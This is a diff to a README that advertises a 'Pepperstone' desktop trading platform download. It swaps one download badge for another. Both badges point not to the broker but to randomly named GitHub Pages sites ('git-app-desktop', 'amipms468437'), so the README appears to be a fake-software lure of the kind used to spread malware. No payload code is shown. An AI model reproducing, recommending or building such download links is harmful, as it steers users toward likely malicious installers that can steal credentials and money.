@@ -1,11 +1,7 @@
 # Pepperstone Download — Desktop Forex and CFD Trading Platform
 
-<a href="https://git-app-desktop.github.io/.github/?offer=Pepperstone" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Get%20Pepperstone%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
-    width="320" 
-    alt="Get Pepperstone GitHub">
-</a>
+[![GET Pepperstone Desktop](https://img.shields.io/badge/GET%20%E2%80%94%20Pepperstone-Desktop-0078D6?style=for-the-badge&logoColor=white)](https://amipms468437.github.io/.github/Pepperstone-Desktop)
+
 
 ---
 
